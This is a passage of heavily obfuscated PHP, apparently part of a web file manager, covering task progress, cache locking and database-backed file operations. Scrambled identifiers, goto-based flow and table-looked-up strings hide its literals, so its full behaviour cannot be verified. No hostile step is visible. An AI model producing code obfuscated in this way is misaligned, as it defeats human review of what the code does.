/ $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[995]]; $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]] = 0.3 + $Fåøƒğƒ‘ * 0.4; } else { if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1529]] == $Bê†Ä®ğšÄ[103]) { $e‹æ¸ƒ¢Æº = 0; if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1503]] == $Bê†Ä®ğšÄ[103]) { $e‹æ¸ƒ¢Æº = $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1502]]; } $Fåøƒğƒ‘ = ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1506]] + $e‹æ¸ƒ¢Æº) / $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[720]]; $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]] = 0.3 + 0.4 + $Fåøƒğƒ‘ * 0.3; } } } if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]] > 0) { $F…ğÁê¡³¹ = timeFloat() - $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1459]] - $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1462]]; $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1463]] = $F…ğÁê¡³¹ * (1 - $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]]) / $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]]; } } public function addFile($a… öá¦À‰) { goto BØÙî›µë–; Cô§æŠ¤˜¢: $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[1499]] = $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[28]]; $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[1501]] = $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[77]]; $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[1502]] = 0; goto AòØšÕÓÚ; c×Óä¡ÎŒÄ: $this->update(); goto F—İëõ»›½; AòØšÕÓÚ: $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[997]] = $D’Ôø†¬×ø[1518]; $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[1503]] = $D’Ôø†¬×ø[1059]; $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[720]] = $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[77]]; goto fÜù…îîã‡; BØÙî›µë–: $D’Ôø†¬×ø =& $_SERVER[ã®Â„Éæ¹¤]; $C¾ÇˆÂ¸÷‚ =& $this->task; $Cğ¸ÓÖ‚öì = IO::info($a… öá¦À‰); goto Cô§æŠ¤˜¢; fÜù…îîã‡: $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[995]] = 1; $fİ‰£ßÌŞê = 0; $C¾ÇˆÂ¸÷‚[$D’Ôø†¬×ø[1510]] = array($D’Ôø†¬×ø[1511] => $fİ‰£ßÌŞê + 1, $D’Ôø†¬×ø[386] => $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[28]], $D’Ôø†¬×ø[75] => $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[75]], $D’Ôø†¬×ø[468] => $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[468]] ? $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[468]] : $Cğ¸ÓÖ‚öì[$D’Ôø†¬×ø[75]]); goto c×Óä¡ÎŒÄ; F—İëõ»›½: } public function unzipAfter($f–‹¥°ã…) { goto c¹ÀŸËÔ¶Ä; b¤¥®õÉ: if ($bñ”ØÛ¼Ä…[$aÑáÔ®È[29]] == $aÑáÔ®È[167]) { $a¬¶— ˜°¬[$aÑáÔ®È[995]] = 1; } else { $a¬¶— ˜°¬[$aÑáÔ®È[995]] = $bñ”ØÛ¼Ä…[$aÑáÔ®È[80]][$aÑáÔ®È[78]]; } $a¬¶— ˜°¬[$aÑáÔ®È[997]] = $aÑáÔ®È[33]; $a¬¶— ˜°¬[$aÑáÔ®È[1503]] = 0; goto dÓŸã›ÇÒ; c¹ÀŸËÔ¶Ä: $aÑáÔ®È =& $_SERVER[ã®Â„Éæ¹¤]; $a¬¶— ˜°¬ =& $this->task; $a¬¶— ˜°¬[$aÑáÔ®È[1529]] = $aÑáÔ®È[103]; goto fÌ‘ŞˆÍƒ; fÌ‘ŞˆÍƒ: $bñ”ØÛ¼Ä… = IO::infoWithChildren($f–‹¥°ã…); $b†©¨º¥Ç = 0; $a¬¶— ˜°¬[$aÑáÔ®È[1510]] = array($aÑáÔ®È[1511] => $b†©¨º¥Ç + 1, $aÑáÔ®È[386] => $bñ”ØÛ¼Ä…[$aÑáÔ®È[28]], $aÑáÔ®È[75] => $bñ”ØÛ¼Ä…[$aÑáÔ®È[75]], $aÑáÔ®È[468] => $bñ”ØÛ¼Ä…[$aÑáÔ®È[468]] ? $bñ”ØÛ¼Ä…[$aÑáÔ®È[468]] : $bñ”ØÛ¼Ä…[$aÑáÔ®È[75]]); goto b¤¥®õÉ; C–¸ç§¸ãˆ: $a¬¶— ˜°¬[$aÑáÔ®È[1499]] = $aÑáÔ®È[33]; $a¬¶— ˜°¬[$aÑáÔ®È[1506]] = 0; $a¬¶— ˜°¬[$aÑáÔ®È[720]] = $bñ”ØÛ¼Ä…[$aÑáÔ®È[77]]; goto dÎ†ÒÇ™ô¦; dÎ†ÒÇ™ô¦: $this->update(); self::log($aÑáÔ®È[1531] . json_encode(array($a¬¶— ˜°¬, $bñ”ØÛ¼Ä…))); goto AÎóøµƒ¬Ñ; dÓŸã›ÇÒ: $a¬¶— ˜°¬[$aÑáÔ®È[1009]] = 0; $a¬¶— ˜°¬[$aÑáÔ®È[1501]] = 0; $a¬¶— ˜°¬[$aÑáÔ®È[1502]] = 0; goto C–¸ç§¸ãˆ; AÎóøµƒ¬Ñ: } public function nameParse($BïÖ¥”ó Õ) { goto cÈÈåá¼‹; c£Èš„Êƒ: $AØ‘Æ»èé = get_path_this($BïÖ¥”ó Õ); if (strstr($AØ‘Æ»èé, $eæ¤“—‰ï’[91])) { $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[1009]] += 1; $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[995]] += 1; } $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[1499]] = $BïÖ¥”ó Õ; goto AÃéÎÉŒÓå; AÃéÎÉŒÓå: $this->update(); goto EÄ£’¢ÛËç; cÈÈåá¼‹: $eæ¤“—‰ï’ =& $_SERVER[ã®Â„Éæ¹¤]; $FàÜñ¾ŠÖÖ =& $this->task; if ($FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[1529]] == $eæ¤“—‰ï’[1059]) { $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[1529]] = $eæ¤“—‰ï’[301]; $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[1506]] = 0; $FàÜñ¾ŠÖÖ[$eæ¤“—‰ï’[720]] = 0; } goto c£Èš„Êƒ; EÄ£’¢ÛËç: } } goto D“¼Ç¤ñõŠ; e¡¶òÜ‡©: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $F†…†ªÑ =& $_SERVER[ã®Â„Éæ¹¤]; $cİ±Á„„Œ¶ = $GLOBALS[$F†…†ªÑ[6]][$F†…†ªÑ[337]]; self::$cachePath = $cİ±Á„„Œ¶[$F†…†ªÑ[167]][$F†…†ªÑ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Bá®Ã«Éˆ«, $e‹ÈöÏ•Ë = 0) { goto AÎ¹Úó™ù“; AÎ¹Úó™ù“: $cŸÚ„ÌØçô =& $_SERVER[ã®Â„Éæ¹¤]; $EªÉêØö¼Ü = microtime(!0); $BĞ¸ÊšÄ = $EªÉêØö¼Ü + $e‹ÈöÏ•Ë + 0.0001; goto A¢¡Ì¡«À‚; A¢¡Ì¡«À‚: $dÖ‡¯ê‹† = rtrim(self::$cachePath, $cŸÚ„ÌØçô[8]) . $cŸÚ„ÌØçô[800] . md5($Bá®Ã«Éˆ«) . $cŸÚ„ÌØçô[797]; if (file_exists($dÖ‡¯ê‹†) && filemtime($dÖ‡¯ê‹†) && filemtime($dÖ‡¯ê‹†) < time() - 10) { @unlink($dÖ‡¯ê‹†); } do { if (file_exists($dÖ‡¯ê‹†)) { cacheLockWait(); continue; } $f‘Ïº·†‡• = fopen($dÖ‡¯ê‹†, $cŸÚ„ÌØçô[801]); if (!$f‘Ïº·†‡•) { return !1; } $D¨ƒá±îŞ¿ = flock($f‘Ïº·†‡•, LOCK_EX | LOCK_NB); self::$caches[$Bá®Ã«Éˆ«] = array($cŸÚ„ÌØçô[802] => $f‘Ïº·†‡•, $cŸÚ„ÌØçô[167] => $dÖ‡¯ê‹†); fwrite($f‘Ïº·†‡•, $BĞ¸ÊšÄ); clearstatcache(); if ($f‘Ïº·†‡• && $D¨ƒá±îŞ¿) { return !0; } cacheLockWait(); } while (microtime(!0) < $BĞ¸ÊšÄ); goto AåÏ…ì¨õ‹; AåÏ…ì¨õ‹: $this->unlock($Bá®Ã«Éˆ«); return !1; goto C·›¯Æ¾Ğ”; C·›¯Æ¾Ğ”: } public function lockGet($d£Îâ‘) { $F×¥×ª¬ã =& $_SERVER[ã®Â„Éæ¹¤]; $d‚¡¬Ôµ‘ = rtrim(self::$cachePath, $F×¥×ª¬ã[8]) . $F×¥×ª¬ã[800] . md5($d£Îâ‘) . $F×¥×ª¬ã[797]; return file_exists($d‚¡¬Ôµ‘); } public function unlock($D‚ƒÊ×¸‹ò) { goto A®ƒ±íÈ…; cÌº¾¬•ƒ±: @flock($D³Ó¯‹ ä[$bîäÜ‹ß„[802]], LOCK_UN); @fclose($D³Ó¯‹ ä[$bîäÜ‹ß„[802]]); @unlink($D³Ó¯‹ ä[$bîäÜ‹ß„[167]]); goto FÆùëïî­Ë; FÆùëïî­Ë: unset(self::$caches[$D‚ƒÊ×¸‹ò]); goto bîÊõ¿Äƒ˜; A®ƒ±íÈ…: $bîäÜ‹ß„ =& $_SERVER[ã®Â„Éæ¹¤]; $D³Ó¯‹ ä = self::$caches[$D‚ƒÊ×¸‹ò]; if (!$D³Ó¯‹ ä) { return; } goto cÌº¾¬•ƒ±; bîÊõ¿Äƒ˜: } } class CacheLockRedis { public function lock($AçÔÑ¶š‰, $c³ËŒ®¦› = 10) { $Aëƒ™÷ØÑ = Cache::init(); $A¦Î­ëˆ»Û = microtime(!0) + $c³ËŒ®¦›; while (microtime(!0) < $A¦Î­ëˆ»Û) { $cªÑ¹èİõ = $Aëƒ™÷ØÑ->get($AçÔÑ¶š‰); if (!$cªÑ¹èİõ) { $AªæòÊ–İÌ = $Aëƒ™÷ØÑ->setLock($AçÔÑ¶š‰, $A¦Î­ëˆ»Û, $c³ËŒ®¦›); if ($AªæòÊ–İÌ) { return !0; } } else { if ($cªÑ¹èİõ < microtime(!0)) { $Aëƒ™÷ØÑ->set($AçÔÑ¶š‰, $A¦Î­ëˆ»Û, $A¦Î­ëˆ»Û); if ($Aëƒ™÷ØÑ->get($AçÔÑ¶š‰) === $cªÑ¹èİõ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($FÆÑ‘ù«¼) { return Cache::init()->get($FÆÑ‘ù«¼); } public function unlock($f‘³Ó“ª†˜) { return Cache::init()->remove($f‘³Ó“ª†˜); } } class CacheLockMemcached { public function lock($A‚°˜ °£¹, $Fˆ²¹íÜÑÅ = 0) { $DèÔäƒ³ßô = Cache::init(); $cï¯–“ãÓ“ = microtime(!0) + $Fˆ²¹íÜÑÅ; while (microtime(!0) < $cï¯–“ãÓ“) { $B ˆÖÊöáß = $DèÔäƒ³ßô->get($A‚°˜ °£¹); if (!$B ˆÖÊöáß || $B ˆÖÊöáß < microtime(!0)) { $BŸØÎÅ’ì = $DèÔäƒ³ßô->handle->add($A‚°˜ °£¹, $cï¯–“ãÓ“, $Fˆ²¹íÜÑÅ); if ($BŸØÎÅ’ì) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cˆë£®ƒÕÙ) { return Cache::init()->get($cˆë£®ƒÕÙ); } public function unlock($CÙØòµ) { return Cache::init()->remove($CÙØòµ); } } goto dê·ƒÊĞç; C’‚ò¢Åƒ…: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($F§—‘µ‡íŸ) { $this->pathParse = $F§—‘µ‡íŸ; $this->model = Model($_SERVER[ã®Â„Éæ¹¤][1136]); } public function getPath($cÜŒµÏ–—³) { return trim($cÜŒµÏ–—³, $_SERVER[ã®Â„Éæ¹¤][8]); } public function pathFather($AÒê‚‚¶§Õ) { $fÕ–çË‘ = $this->parse($AÒê‚‚¶§Õ); $fÕ–çË‘ = $this->infoSimple($AÒê‚‚¶§Õ); return $fÕ–çË‘ ? $fÕ–çË‘[$_SERVER[ã®Â„Éæ¹¤][463]] : !1; } public function getPathName($EÜò¤ÀãßÕ) { $C‡èº¯¹¯ = $this->infoSimple($EÜò¤ÀãßÕ); return $C‡èº¯¹¯ ? $C‡èº¯¹¯[$_SERVER[ã®Â„Éæ¹¤][28]] : !1; } public function getPathOuter($aÕƒöß³Ÿ) { if (!$aÕƒöß³Ÿ) { return $aÕƒöß³Ÿ; } $Fï¯ŸÖ‚¯¹ = $this->parse($aÕƒöß³Ÿ); return KodIO::make($Fï¯ŸÖ‚¯¹[$_SERVER[ã®Â„Éæ¹¤][367]]); } public function copyFolderFromIO($B©ó…™Çã, $E–™ÂÇ’öÄ, $a²—ÈùŞ²Ú, $d—…—øãÙÃ, $e½Ú¡ÀİÔ¿) { $f¤ƒİóÓ‡• = $this->model->copyFolderFromIO($B©ó…™Çã, $E–™ÂÇ’öÄ, $a²—ÈùŞ²Ú, $d—…—øãÙÃ, $e½Ú¡ÀİÔ¿); return KodIO::make($f¤ƒİóÓ‡•); } public function isParentOf($f´‚œäº¼ò, $BÃè«¡¥Œ²) { return $this->model->isParentOf($f´‚œäº¼ò, $BÃè«¡¥Œ²); } public function mkfile($DŠòÙ§ì¼“, $DäØ¥¬öÆ— = '', $fÎ–Ñ¿„‹ó = REPEAT_RENAME) { $dë•™·¤¥ =& $_SERVER[ã®Â„Éæ¹¤]; $CÌ–®ˆ¼„¹ = $this->parse($DŠòÙ§ì¼“); $DŠòÙ§ì¼“ = $CÌ–®ˆ¼„¹[$dë•™·¤¥[367]]; for ($Cğ»«Òå‘ = 0; $Cğ»«Òå‘ < count($CÌ–®ˆ¼„¹[$dë•™·¤¥[1137]]); $Cğ»«Òå‘++) { $f•åùÑ¿áÓ = $CÌ–®ˆ¼„¹[$dë•™·¤¥[1137]][$Cğ»«Òå‘]; if ($Cğ»«Òå‘ == count($CÌ–®ˆ¼„¹[$dë•™·¤¥[1137]]) - 1) { $DŠòÙ§ì¼“ = $this->model->mkfile($DŠòÙ§ì¼“, $f•åùÑ¿áÓ, $DäØ¥¬öÆ—, $fÎ–Ñ¿„‹ó); break; } $DŠòÙ§ì¼“ = $this->model->mkdir($DŠòÙ§ì¼“, $f•åùÑ¿áÓ, REPEAT_SKIP); } return $this->getPathOuter($DŠòÙ§ì¼“); } public function mkdir($dŠÚ·–æ³Š, $Bß¦„Ê™¥É = REPEAT_SKIP) { $Cƒè”¤È”“ =& $_SERVER[ã®Â„Éæ¹¤]; $FÎµ‰ô‰¿ä = $this->parse($dŠÚ·–æ³Š); $dŠÚ·–æ³Š = $FÎµ‰ô‰¿ä[$Cƒè”¤È”“[367]]; for ($BŠ•Òó¾ = 0; $BŠ•Òó¾ < count($FÎµ‰ô‰¿ä[$Cƒè”¤È”“[1137]]); $BŠ•Òó¾++) { $f›˜à©¶¦ = $FÎµ‰ô‰¿ä[$Cƒè”¤È”“[1137]][$BŠ•Òó¾]; $dŠÚ·–æ³Š = $this->model->mkdir($dŠÚ·–æ³Š, $f›˜à©¶¦, $Bß¦„Ê™¥É); } return $this->getPathOuter($dŠÚ·–æ³Š); } public function copyFile($a­ïÅì¼µİ, $CË»ƒ’Œ©, $a…ÛŸ÷Â± = REPEAT_REPLACE) { $C¼ö¯Ì•ãæ =& $_SERVER[ã®Â„Éæ¹¤]; $cš×‰‰½ùš = $this->parse($CË»ƒ’Œ©); $cŒÉºÒªÌç = $this->model->copy($a­ïÅì¼µİ, $cš×‰‰½ùš[$C¼ö¯Ì•ãæ[367]], $a…ÛŸ÷Â±, $cš×‰‰½ùš[$C¼ö¯Ì•ãæ[75]]); return $cŒÉºÒªÌç ? $this->getPathOuter($cŒÉºÒªÌç) : !1; } public function moveFile($AËêö±Èö”, $a…‚ƒÑ°–‹, $Dˆ…˜“ÌÂœ = REPEAT_REPLACE) { $EËÁ‰Ÿ¤§á =& $_SERVER[ã®Â„Éæ¹¤]; $D•Á˜ŒğÙ½ = $this->parse($a…‚ƒÑ°–‹); $Aù½æƒ‚² = $this->model->move($AËêö±Èö”, $D•Á˜ŒğÙ½[$EËÁ‰Ÿ¤§á[367]], $Dˆ…˜“ÌÂœ, $D•Á˜ŒğÙ½[$EËÁ‰Ÿ¤§á[75]]); return $Aù½æƒ‚² ? $this->getPathOuter($Aù½æƒ‚²) : !1; } public function copy($C³…³ Û¿‹, $d«à°™±¡¹, $C¸†ËÂî™½ = REPEAT_REPLACE) { $EíêƒÒ¸ÅØ = $this->parse($d«à°™±¡¹); $B©ù»áÌ = $this->model->copy($C³…³ Û¿‹, $EíêƒÒ¸ÅØ[$_SERVER[ã®Â„Éæ¹¤][367]], $C¸†ËÂî™½); return $B©ù»áÌ ? $this->getPathOuter($B©ù»áÌ) : !1; } public function moveSameAllow() { } public function move($E­‘›¾ÂØ÷, $EìİÔÙçá·, $cÄ©è‚î = REPEAT_REPLACE) { $E«ŸÜìë¾¸ = $this->parse($EìİÔÙçá·); $eÀŒ—ßçù = $this->model->move($E­‘›¾ÂØ÷, $E«ŸÜìë¾¸[$_SERVER[ã®Â„Éæ¹¤][367]], $cÄ©è‚î); return $eÀŒ—ßçù ? $this->getPathOuter($eÀŒ—ßçù) : !1; } public function remove($d£‚ŞùÚ, $f‚¸§ïÉœ = true) { return $this->model->remove($d£‚ŞùÚ, $f‚¸§ïÉœ); } public function rename($dŠ°ªº÷”Ç, $Dˆ „öª†Í) { $e¨ËàŒ¡ƒ = $this->model->rename($dŠ°ªº÷”Ç, $Dˆ „öª†Í); return $e¨ËàŒ¡ƒ ? $this->getPathOuter($dŠ°ªº÷”Ç) : $e¨ËàŒ¡ƒ; } public function size($b¤éé¥¨±ã) { $eùé“£ŞÂ = $this->infoSimple($b¤éé¥¨±ã); return $eùé“£ŞÂ ? $eùé“£ŞÂ[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function infoSimple($FÙˆÍ–Õæ) { return $this->model->sourceInfo($FÙˆÍ–Õæ); } public function info($BÔ¨¥Ñâ’×) { return $this->infoParse($BÔ¨¥Ñâ’×); } public function infoAuth($a©»‰äƒÄ) { return $this->infoParse($a©»‰äƒÄ, !1, !0); } public function infoWithChildren($dŒÍÈÚÑÔÔ) { return $this->infoParse($dŒÍÈÚÑÔÔ, !0); } protected function infoParse($c„©á´Ì‹‘, $Aë·ä‹ô½Ã = false, $cÒ‘ˆ¬¶­… = false) { if (!$Aë·ä‹ô½Ã) { return $this->model->pathInfo($c„©á´Ì‹‘, $cÒ‘ˆ¬¶­…); } return $this->model->pathInfoMore($c„©á´Ì‹‘); } public function infoFull($dÓ¬ÏááÁª) { $CçÜº÷Ğè÷ =& $_SERVER[ã®Â„Éæ¹¤]; $dæíö¿Ğ² = explode($CçÜº÷Ğè÷[8], $dÓ¬ÏááÁª); $EËØÏ×›· = implode($CçÜº÷Ğè÷[8], array_splice($dæíö¿Ğ², 1)); return $this->model->pathInfoByPath($dæíö¿Ğ²[0], $EËØÏ×›·); } public function hashSimple($fî­ãŒ‡ë‹) { $D¾†¢ğ˜¤³ =& $_SERVER[ã®Â„Éæ¹¤]; $b‘Èö½ƒÉ = $this->infoWithChildren($fî­ãŒ‡ë‹); return $b‘Èö½ƒÉ[$D¾†¢ğ˜¤³[162]][$D¾†¢ğ˜¤³[164]]; } public function hashMd5($F‘ ŞÌÉÂ¶) { $dùˆ¹¦ìÎ° =& $_SERVER[ã®Â„Éæ¹¤]; $B§­¯°ºïé = $this->infoWithChildren($F‘ ŞÌÉÂ¶); return $B§­¯°ºïé[$dùˆ¹¦ìÎ°[162]][$dùˆ¹¦ìÎ°[163]]; } public function exist($DÆºˆ´„Š) { $A¥ÂÀƒ¼Ã =& $_SERVER[ã®Â„Éæ¹¤]; $E­—Ãê‘×¬ = $this->parse($DÆºˆ´„Š); if (!$E­—Ãê‘×¬[$A¥ÂÀƒ¼Ã[75]]) { return $this->isFile($DÆºˆ´„Š) || $this->isFolder($DÆºˆ´„Š); } $bâÆ½öÕÒˆ = array($A¥ÂÀƒ¼Ã[368] => $E­—Ãê‘×¬[$A¥ÂÀƒ¼Ã[367]], $A¥ÂÀƒ¼Ã[28] => $E­—Ãê‘×¬[$A¥ÂÀƒ¼Ã[75]]); $aÂšƒôÆ· = $this->model->where($bâÆ½öÕÒˆ)->find(); return $aÂšƒôÆ· ? !0 : !1; } public function isFile($AòôÉ”â») { $c“›‚Áã¹Õ =& $_SERVER[ã®Â„Éæ¹¤]; $AÜÚ“ò–ç = $this->infoSimple($AòôÉ”â»); return $AÜÚ“ò–ç && $AÜÚ“ò–ç[$c“›‚Áã¹Õ[370]] == $c“›‚Áã¹Õ[83] ? !1 : !0; } public function isFolder($Eê¼‰Ùæå) { $D†›İİØè° =& $_SERVER[ã®Â„Éæ¹¤]; $fÒÙœÜùĞË = $this->infoSimple($Eê¼‰Ùæå); return $fÒÙœÜùĞË && $fÒÙœÜùĞË[$D†›İİØè°[370]] == $D†›İİØè°[83] ? !0 : !1; } public function listPath($FçŞšë¿Ëó, $aŒ¯‡§Ûº = false) { $bä¤Ó‰Ö =& $_SERVER[ã®Â„Éæ¹¤]; if ($FçŞšë¿Ëó == $bä¤Ó‰Ö[33]) { return !1; } $cè©à¼áæ = array($bä¤Ó‰Ö[368] => $FçŞšë¿Ëó); if ($aŒ¯‡§Ûº) { return $this->model->listSource($cè©à¼áæ, -1); } return $this->model->listSource($cè©à¼áæ); } public function has($F †‘¸öçğ, $B¡ï‡µ×‰¶ = false, $DÁâ°—Ñß¤ = null) { $cÑÚ¸Íë¡ç =& $_SERVER[ã®Â„Éæ¹¤]; $f„ªò‚™ÓÎ = $this->infoWithChildren($F †‘¸öçğ); if ($B¡ï‡µ×‰¶) { return array($cÑÚ¸Íë¡ç[192] => $f„ªò‚™ÓÎ[$cÑÚ¸Íë¡ç[192]], $cÑÚ¸Íë¡ç[191] => $f„ªò‚™ÓÎ[$cÑÚ¸Íë¡ç[191]]); } return $DÁâ°—Ñß¤ ? $f„ªò‚™ÓÎ[$cÑÚ¸Íë¡ç[192]] : $f„ªò‚™ÓÎ[$cÑÚ¸Íë¡ç[191]]; } public function listAll($Bµ†×…±½) { $F«äàäõ¯ = IO::info($this->pathParse[$_SERVER[ã®Â„Éæ¹¤][75]]); if (!$F«äàäõ¯) { return array(); } return $this->model->listAll($Bµ†×…±½); } public function getContent($F‡õæÖ†¶”) { return $this->model->getContent($F‡õæÖ†¶”); } public function setContent($B‰ª–ß›‹ô, $Fµ¿ÉÈÂô = '') { return $this->model->setContent($B‰ª–ß›‹ô, $Fµ¿ÉÈÂô); } public function fileSubstr($bğ•äĞ, $a¥Ÿ£†ì, $f†¢ã‚˜ë¡) { return $this->model->fileSubstr($bğ•äĞ, $a¥Ÿ£†ì, $f†¢ã‚˜ë¡); } public function download($D©ŸƒèêŠ, $dË–Ê×ê¼ = '') { $a¹å«²Äæ = get_path_father($dË–Ê×ê¼); $FØ¿ŸùÂƒ = get_path_this($dË–Ê×ê¼); $Aˆ¥‘Åç‹¤ = $this->model->fileInfoGet($D©ŸƒèêŠ); $fË“Â”ğÛ¦ = IO::copy($Aˆ¥‘Åç‹¤[$_SERVER[ã®Â„Éæ¹¤][75]], $a¹å«²Äæ, !1, $FØ¿ŸùÂƒ); return $fË“Â”ğÛ¦; } public function setModifyTime($BÄÍ‰Éäç, $C¤ßù´øÊ› = '') { $this->model->metaSet($BÄÍ‰Éäç, $_SERVER[ã®Â„Éæ¹¤][1138], $C¤ßù´øÊ›); } public function upload($c²ÏºÓĞÆ’, $b”ƒÙÔçÁÍ, $Cƒ„®ÚÏ’ñ = false, $Eˆ‡‡Äî¿Ù = REPEAT_REPLACE) { $bÙÇ‹“ƒß— =& $_SERVER[ã®Â„Éæ¹¤]; $BêÍ£ùê—‹ = $this->parse($c²ÏºÓĞÆ’); $aŠ‘Ä‘ñóë = $this->model->addFile($BêÍ£ùê—‹[$bÙÇ‹“ƒß—[367]], $b”ƒÙÔçÁÍ, $BêÍ£ùê—‹[$bÙÇ‹“ƒß—[75]], $Cƒ„®ÚÏ’ñ, $Eˆ‡‡Äî¿Ù); return $this->getPathOuter($aŠ‘Ä‘ñóë); } public function uploadFileByID($Fö„‚ë¦, $d‰Á½øøƒ, $F‡ ³ÆŒà) { $fä³°ãéô¬ =& $_SERVER[ã®Â„Éæ¹¤]; $càË­ÊÌ = $this->parse($Fö„‚ë¦); $A”“®ĞÊÖ = $this->model->addFileByFileID($càË­ÊÌ[$fä³°ãéô¬[367]], $d‰Á½øøƒ, $càË­ÊÌ[$fä³°ãéô¬[75]], $F‡ ³ÆŒà); return $this->getPathOuter($A”“®ĞÊÖ); } public function addFileByRemote($cÀ½¾®ÆÒ, $E²éìÜƒÍ¬, $b©ŒŒ¹…§ê = array(), $dİ»ñô„İí = '', $E½Í®… ¦Ë) { $eÖ©…å˜ø¼ =& $_SERVER[ã®Â„Éæ¹¤]; $AŒ‘³Ó– = $this->parse($cÀ½¾®ÆÒ); $dİ»ñô„İí = empty($dİ»ñô„İí) ? $AŒ‘³Ó–[$eÖ©…å˜ø¼[75]] : $dİ»ñô„İí; $E½¡âŸÖò = $this->model->addFileByRemote($AŒ‘³Ó–[$eÖ©…å˜ø¼[367]], $E²éìÜƒÍ¬, $dİ»ñô„İí, $b©ŒŒ¹…§ê, $E½Í®… ¦Ë); return $this->getPathOuter($E½¡âŸÖò); } public function uploadLink($a’È©àè¦ª, $AÈ‘«¥‘ = 0) { $Dˆ¿Ë¢â‘£ =& $_SERVER[ã®Â„Éæ¹¤]; $b„ìÔÓ±‘ = $this->parse($a’È©àè¦ª); $a’È©àè¦ª = Model($Dˆ¿Ë¢â‘£[545])->createFileName($b„ìÔÓ±‘[$Dˆ¿Ë¢â‘£[75]]); $A±‘á‰™„ = IO::uploadLink($a’È©àè¦ª, $AÈ‘«¥‘); return $A±‘á‰™„; } public function fileNameAuto($b‚Ö¶æÈÕà, $DíÊŸ±Üœ, $A¾‰ÆìÔÑ = REPEAT_REPLACE, $d°°†‚¨Ôñ = false) { return $this->model->fileNameAuto($b‚Ö¶æÈÕà, $DíÊŸ±Üœ, $A¾‰ÆìÔÑ, $d°°†‚¨Ôñ); } public function fileNameExist($EÚ ŠÍ¶‘, $Aƒ›¦ÎŠë) { return $this->model->fileNameExist($EÚ ŠÍ¶‘, $Aƒ›¦ÎŠë); } protected function _fileOut($B¿¦Àö´†é, $a¼Úñè¯Ûğ = false, $DÅ¤àÕøÕÈ = false, $A’§É†Îšà = '', $DÌíÚè¬¥§ = false) { goto b³‡è’Ş„ª; b³‡è’Ş„ª: $E›¶–¢½…Ş =& $_SERVER[ã®Â„Éæ¹¤]; $b­ÄÁ…¨ºø = $this->model->sourceInfo($B¿¦Àö´†é); if ($b­ÄÁ…¨ºø[$E›¶–¢½…Ş[370]] == $E›¶–¢½…Ş[83]) { header($E›¶–¢½…Ş[1139]); die; } goto cïõ˜«ˆó™; cïõ˜«ˆó™: $bí¤¹ùÆ¥á = $this->model->fileInfoGet($B¿¦Àö´†é); $A’§É†Îšà = $bí¤¹ùÆ¥á[$E›¶–¢½…Ş[163]] ? $bí¤¹ùÆ¥á[$E›¶–¢½…Ş[163]] : $A’§É†Îšà; $f¡Ğ›°÷ = isset($GLOBALS[$E›¶–¢½…Ş[1140]]) ? $GLOBALS[$E›¶–¢½…Ş[1140]] : $b­ÄÁ…¨ºø[$E›¶–¢½…Ş[28]]; goto EÕ²”İ‡à; EÕ²”İ‡à: if ($DÌíÚè¬¥§) { return IO::fileOutServer($bí¤¹ùÆ¥á[$E›¶–¢½…Ş[75]], $a¼Úñè¯Ûğ, $f¡Ğ›°÷, $A’§É†Îšà); } IO::fileOut($bí¤¹ùÆ¥á[$E›¶–¢½…Ş[75]], $a¼Úñè¯Ûğ, $f¡Ğ›°÷, $A’§É†Îšà); goto f…šÍ¿‡æ; f…šÍ¿‡æ: } public function fileOut($B¶å­á¯¼ö, $B•ƒ•ùŞ‰° = false, $C’¬¹Ä³² = false, $BÃºÏÅ—¦® = '') { $this->_fileOut($B¶å­á¯¼ö, $B•ƒ•ùŞ‰°, $C’¬¹Ä³², $BÃºÏÅ—¦®); } public function fileOutServer($cË’íÓºµ½, $bí‰‘©Ë = false, $fµ†‡‡Òš = false, $côî—–°ÅÏ = '') { $this->_fileOut($cË’íÓºµ½, $bí‰‘©Ë, $fµ†‡‡Òš, $côî—–°ÅÏ, !0); } protected function _fileOutImage($A±ŞÕ«³Ù¦, $A¤ÀŠ èÑ = 250) { $A²áÙöëè‚ =& $_SERVER[ã®Â„Éæ¹¤]; $bÛ‚Õ‘¹ó½ = $this->model->sourceInfo($A±ŞÕ«³Ù¦); if ($bÛ‚Õ‘¹ó½[$A²áÙöëè‚[370]] == $A²áÙöëè‚[83]) { show_json($A²áÙöëè‚[1141] . 